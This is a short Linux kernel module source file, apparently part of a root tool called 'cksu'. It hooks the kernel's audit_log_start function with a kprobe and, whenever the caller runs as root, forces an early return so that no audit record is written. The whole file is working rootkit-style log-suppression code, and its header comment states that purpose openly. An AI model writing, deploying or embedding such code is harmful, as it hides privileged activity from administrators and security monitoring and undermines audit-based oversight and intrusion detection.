// SPDX-License-Identifier: GPL-2.0-only
/*
 * audit.c — hook audit_log_start, suppress root audit logs
 *
 * Copyright (C) 2026 dere3046
 */

#include <linux/module.h>
#include <linux/kprobes.h>
#include <linux/cred.h>
#include <linux/sched.h>
#include "kprobe.h"
#include "audit.h"

static struct cksu_hook hook_audit_log_start;

static int handler_audit_log_start(struct kprobe *p, struct pt_regs *regs)
{
	if (uid_eq(current_uid(), GLOBAL_ROOT_UID)) {
		regs->regs[0] = 0;
		regs->pc = regs->regs[30];
		return 1;
	}
	return 0;
}

int cksu_audit_init(void)
{
	return cksu_hook_install(&hook_audit_log_start, "audit_log_start",
				 handler_audit_log_start);
}

void cksu_audit_exit(void)
{
	cksu_hook_remove(&hook_audit_log_start);
}
